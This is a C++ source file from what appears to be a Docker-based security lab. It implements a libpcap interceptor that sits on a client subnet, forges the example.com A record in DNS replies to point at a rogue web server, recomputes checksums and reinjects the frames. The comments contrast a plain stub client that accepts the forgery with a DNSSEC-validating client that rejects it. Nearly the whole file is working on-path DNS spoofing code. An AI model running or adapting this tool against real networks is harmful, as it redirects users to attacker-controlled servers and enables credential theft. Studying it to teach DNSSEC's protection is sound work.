// interceptor.cpp — Phase 6 last-mile DNS response forger
//
// Same pure-libpcap design as the resolver-subnet interceptor from Phases
// 2–4 (capture with pcap_loop, send with pcap_inject; no NFQUEUE, no raw
// sockets), but the adversary has moved to the CLIENT subnet (172.16.1.100)
// and now forges the resolver -> client reply — the last mile, below where
// the validating resolver's DNSSEC guarantee ends.
//
// How the frame reaches us (see edge-router/entrypoint.sh):
//     ip route replace 172.16.1.10/32 via 172.16.1.100   # Client A
//     ip route replace 172.16.1.11/32 via 172.16.1.100   # Client B
// A resolver -> client reply crossing the edge-router is therefore handed
// to US at L2 (Ethernet dst = our MAC) while its IP destination is still
// the client. ip_forward is OFF here (entrypoint.sh) so the kernel never
// relays it on its own; THIS program is the router hop. For every such
// frame we: optionally rewrite the example.com A answer, re-stamp the
// Ethernet header toward the real client, recompute checksums, and inject
// it back out. Non-target replies pass through byte-for-byte — that is what
// keeps ordinary resolution working while the attack is armed.
//
// The two clients differ by design:
//   Client A — ordinary stub (curl / OS resolver). It trusts whatever
//     appears to come from its resolver, so it lands on the rogue page.
//   Client B — validates locally (delv) against the root KSK as its own
//     trust anchor. We rewrite only the A record, not the RRSIG that still
//     covers the genuine 172.16.1.20, so B's own signature check fails and
//     it refuses the forgery. That contrast is the whole point of Phase 6.

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

static const char* IFACE_DEFAULT  = "eth0";
static const char* REPLACEMENT_IP = "172.16.1.30";   // rogue-web
static const int   ETH_HDR_LEN    = 14;

// ---------------------------------------------------------------------
// DNS parsing / rewriting — identical logic to the earlier phases.
// ---------------------------------------------------------------------

static uint16_t checksum(const unsigned char* data, size_t len) {
    uint32_t sum = 0;
    while (len >= 2) {
        sum += (static_cast<uint16_t>(data[0]) << 8) | data[1];
        data += 2;
        len -= 2;
    }
    if (len) sum += static_cast<uint16_t>(data[0]) << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return static_cast<uint16_t>(~sum);
}

static uint16_t read_u16(const unsigned char* p) {
    return (static_cast<uint16_t>(p[0]) << 8) | p[1];
}
static void write_u16(unsigned char* p, uint16_t value) {
    p[0] = static_cast<unsigned char>(value >> 8);
    p[1] = static_cast<unsigned char>(value & 0xff);
}

static bool skip_dns_name(const unsigned char* dns, size_t len, size_t& pos) {
    while (pos < len) {
        unsigned char n = dns[pos];
        if (n == 0) { ++pos; return true; }
        if ((n & 0xc0) == 0xc0) {
            if (pos + 1 >= len) return false;
            pos += 2;
            return true;
        }
        if (n & 0xc0) return false;
        ++pos;
        if (pos + n > len) return false;
        pos += n;
    }
    return false;
}

static bool is_target_response(const unsigned char* dns, size_t len) {
    if (!dns || len < 12) return false;

    uint16_t flags   = read_u16(dns + 2);
    uint16_t qdcount = read_u16(dns + 4);
    uint16_t ancount = read_u16(dns + 6);
    if (!(flags & 0x8000) || qdcount != 1 || ancount == 0) return false;

    size_t pos = 12;
    std::string name;
    while (pos < len) {
        unsigned char label_len = dns[pos++];
        if (label_len == 0) break;
        if ((label_len & 0xc0) != 0 || pos + label_len > len) return false;
        if (!name.empty()) name += '.';
        for (size_t i = 0; i < label_len; ++i) {
            char c = static_cast<char>(dns[pos + i]);
            if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
            name += c;
        }
        pos += label_len;
    }
    if (pos + 4 > len) return false;
    uint16_t qtype  = read_u16(dns + pos);
    uint16_t qclass = read_u16(dns + pos + 2);
    if (name != "example.com" || qtype != 1 || qclass != 1) return false;

    pos += 4;
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type  = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) return true;
        pos += rdlen;
    }
    return false;
}

static bool rewrite_dns_answer(unsigned char* dns, size_t len) {
    if (!is_target_response(dns, len)) return false;

    size_t pos = 12;
    if (!skip_dns_name(dns, len, pos) || pos + 4 > len) return false;
    pos += 4; // QTYPE + QCLASS

    unsigned char replacement[4];
    if (inet_pton(AF_INET, REPLACEMENT_IP, replacement) != 1) return false;

    uint16_t ancount = read_u16(dns + 6);
    for (uint16_t i = 0; i < ancount; ++i) {
        if (!skip_dns_name(dns, len, pos) || pos + 10 > len) return false;
        uint16_t type  = read_u16(dns + pos);
        uint16_t klass = read_u16(dns + pos + 2);
        uint16_t rdlen = read_u16(dns + pos + 8);
        pos += 10;
        if (pos + rdlen > len) return false;
        if (type == 1 && klass == 1 && rdlen == 4) {
            std::memcpy(dns + pos, replacement, 4);   // only the A rdata; RRSIG left stale on purpose
            return true;
        }
        pos += rdlen;
    }
    return false;
}

static void recalc_checksums(unsigned char* ip_pkt, size_t ip_len, size_t udp_len) {
    ip_pkt[10] = ip_pkt[11] = 0;
    write_u16(ip_pkt + 10, checksum(ip_pkt, ip_len));

    unsigned char* udp = ip_pkt + ip_len;
    udp[6] = udp[7] = 0;
    std::vector<unsigned char> pseudo(12 + udp_len, 0);
    std::memcpy(pseudo.data(), ip_pkt + 12, 8); // src + dst IP
    pseudo[9] = IPPROTO_UDP;
    write_u16(pseudo.data() + 10, static_cast<uint16_t>(udp_len));
    std::memcpy(pseudo.data() + 12, udp, udp_len);
    uint16_t udp_sum = checksum(pseudo.data(), pseudo.size());
    if (udp_sum == 0) udp_sum = 0xffff;
    write_u16(udp + 6, udp_sum);
}

// ---------------------------------------------------------------------
// L2 plumbing: our MAC, and ARP for each downstream client's MAC.
// ---------------------------------------------------------------------

static bool get_own_mac(const std::string& iface, unsigned char mac[6]) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    bool ok = ioctl(fd, SIOCGIFHWADDR, &ifr) == 0;
    if (ok) std::memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return ok;
}

static bool arp_resolve(pcap_t* handle, const unsigned char own_mac[6],
                         const char* own_ip, const char* target_ip,
                         unsigned char out_mac[6]) {
    unsigned char frame[60] = {0};
    std::memset(frame, 0xff, 6);
    std::memcpy(frame + 6, own_mac, 6);
    write_u16(frame + 12, ETHERTYPE_ARP);

    unsigned char* arp = frame + ETH_HDR_LEN;
    write_u16(arp + 0, 1);
    write_u16(arp + 2, 0x0800);
    arp[4] = 6; arp[5] = 4;
    write_u16(arp + 6, 1);
    std::memcpy(arp + 8, own_mac, 6);
    inet_pton(AF_INET, own_ip, arp + 14);
    std::memset(arp + 18, 0x00, 6);
    inet_pton(AF_INET, target_ip, arp + 24);

    unsigned char want_ip[4];
    inet_pton(AF_INET, target_ip, want_ip);

    for (int attempt = 0; attempt < 5; ++attempt) {
        if (pcap_inject(handle, frame, sizeof(frame)) < 0) return false;

        struct pcap_pkthdr* hdr;
        const unsigned char* pkt;
        time_t deadline = time(nullptr) + 1;
        while (time(nullptr) < deadline) {
            int rc = pcap_next_ex(handle, &hdr, &pkt);
            if (rc != 1) continue;
            if (hdr->caplen < ETH_HDR_LEN + 28) continue;
            if (read_u16(pkt + 12) != ETHERTYPE_ARP) continue;
            const unsigned char* reply_arp = pkt + ETH_HDR_LEN;
            if (read_u16(reply_arp + 6) != 2) continue;
            if (std::memcmp(reply_arp + 14, want_ip, 4) == 0) {
                std::memcpy(out_mac, reply_arp + 8, 6);
                return true;
            }
        }
    }
    return false;
}

// ---------------------------------------------------------------------
// The relay.
// ---------------------------------------------------------------------

struct Downstream {
    uint32_t ip_be;            // client IP in network byte order
    unsigned char mac[6];
};

struct RelayState {
    unsigned char own_mac[6];
    std::vector<Downstream> clients;   // pre-resolved client MACs
    pcap_t* handle;
    bool forge;
};

static const Downstream* find_client(const RelayState* st, uint32_t dst_be) {
    for (const auto& c : st->clients)
        if (c.ip_be == dst_be) return &c;
    return nullptr;
}

static void handle_packet(unsigned char* user, const struct pcap_pkthdr* hdr,
                           const unsigned char* bytes) {
    auto* st = reinterpret_cast<RelayState*>(user);
    if (hdr->caplen < ETH_HDR_LEN + sizeof(iphdr)) return;

    // Ignore frames we injected ourselves.
    if (std::memcmp(bytes + 6, st->own_mac, 6) == 0) return;
    if (read_u16(bytes + 12) != ETHERTYPE_IP) return;

    std::vector<unsigned char> frame(bytes, bytes + hdr->caplen);
    unsigned char* ip_pkt = frame.data() + ETH_HDR_LEN;
    auto* ip = reinterpret_cast<iphdr*>(ip_pkt);
    if (ip->version != 4 || ip->protocol != IPPROTO_UDP) return;

    size_t ip_len = static_cast<size_t>(ip->ihl) * 4;
    size_t remaining = frame.size() - ETH_HDR_LEN;
    if (remaining < ip_len + sizeof(udphdr)) return;

    auto* udp = reinterpret_cast<udphdr*>(ip_pkt + ip_len);
    size_t udp_len = ntohs(udp->len);
    if (ntohs(udp->source) != 53) return;                 // resolver -> client reply
    if (udp_len < sizeof(udphdr) + 12 || ip_len + udp_len > remaining) return;

    // Which client is this reply for? (We only relay the diverted clients.)
    uint32_t dst_be;
    std::memcpy(&dst_be, ip_pkt + 16, 4);
    const Downstream* client = find_client(st, dst_be);
    if (!client) return;

    unsigned char* dns = ip_pkt + ip_len + sizeof(udphdr);
    size_t dns_len = udp_len - sizeof(udphdr);

    bool rewritten = false;
    if (st->forge) rewritten = rewrite_dns_answer(dns, dns_len);

    // Recompute checksums for every packet (Docker veth CHECKSUM_PARTIAL
    // offload leaves stale/zero sums on captured frames; re-injected frames
    // are validated in software by the receiver, so a stale sum = silent drop).
    recalc_checksums(ip_pkt, ip_len, udp_len);

    // Re-address at L2 toward the real client and put it on the wire.
    std::memcpy(frame.data() + 0, client->mac, 6);
    std::memcpy(frame.data() + 6, st->own_mac, 6);
    pcap_inject(st->handle, frame.data(), frame.size());

    char src[INET_ADDRSTRLEN], dst[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, ip_pkt + 12, src, sizeof(src));
    inet_ntop(AF_INET, ip_pkt + 16, dst, sizeof(dst));
    if (rewritten)
        std::cout << "[DNS match] example.com A reply " << src << " -> " << dst
                  << "; answer forged to " << REPLACEMENT_IP
                  << " (RRSIG left untouched)" << std::endl;
    else
        std::cout << "[relay] " << src << " -> " << dst << " (unchanged)" << std::endl;
}

static std::vector<std::string> split_csv(const std::string& s) {
    std::vector<std::string> out;
    std::stringstream ss(s);
    std::string item;
    while (std::getline(ss, item, ',')) {
        // trim spaces
        size_t a = item.find_first_not_of(" \t");
        size_t b = item.find_last_not_of(" \t");
        if (a != std::string::npos) out.push_back(item.substr(a, b - a + 1));
    }
    return out;
}

int main(int argc, char** argv) {
    std::string mode = (argc > 1) ? argv[1] : "normal";
    bool forge = (mode == "intercept");

    const char* iface_env = std::getenv("IFACE");
    std::string iface = iface_env ? iface_env : IFACE_DEFAULT;
    const char* own_ip_env = std::getenv("ATTACKER_IP");
    std::string own_ip = own_ip_env ? own_ip_env : "172.16.1.100";
    const char* clients_env = std::getenv("CLIENT_IPS");
    std::string clients_csv = clients_env ? clients_env : "172.16.1.10,172.16.1.11";

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface.c_str(), 65536, /*promisc=*/1, 100, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << iface << "): " << errbuf << std::endl;
        return 1;
    }

    struct bpf_program fp;
    const char* filter = "arp or (udp and src port 53)";
    if (pcap_compile(handle, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        std::cerr << "Failed to set BPF filter: " << pcap_geterr(handle) << std::endl;
        return 1;
    }
    pcap_freecode(&fp);

    RelayState st{};
    if (!get_own_mac(iface, st.own_mac)) {
        std::cerr << "Could not read our own MAC on " << iface << std::endl;
        return 1;
    }
    std::cout << "[interceptor] mode=" << mode << " iface=" << iface
              << " forge=" << (forge ? "on" : "off") << std::endl;

    // Pre-resolve each downstream client's MAC (before pcap_loop, so there is
    // no pcap_next_ex reentrancy inside the capture callback).
    for (const auto& ip_str : split_csv(clients_csv)) {
        Downstream d{};
        if (inet_pton(AF_INET, ip_str.c_str(), &d.ip_be) != 1) continue;
        if (!arp_resolve(handle, st.own_mac, own_ip.c_str(), ip_str.c_str(), d.mac)) {
            std::cerr << "[interceptor] WARNING: ARP for client " << ip_str
                      << " failed; its replies will not be relayed" << std::endl;
            continue;
        }
        std::printf("[interceptor] client %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
                    ip_str.c_str(), d.mac[0], d.mac[1], d.mac[2], d.mac[3], d.mac[4], d.mac[5]);
        st.clients.push_back(d);
    }
    if (st.clients.empty()) {
        std::cerr << "[interceptor] no downstream clients resolved; nothing to relay" << std::endl;
        return 1;
    }

    st.handle = handle;
    st.forge = forge;

    pcap_loop(handle, -1, handle_packet, reinterpret_cast<unsigned char*>(&st));

    pcap_close(handle);
    return 0;
}
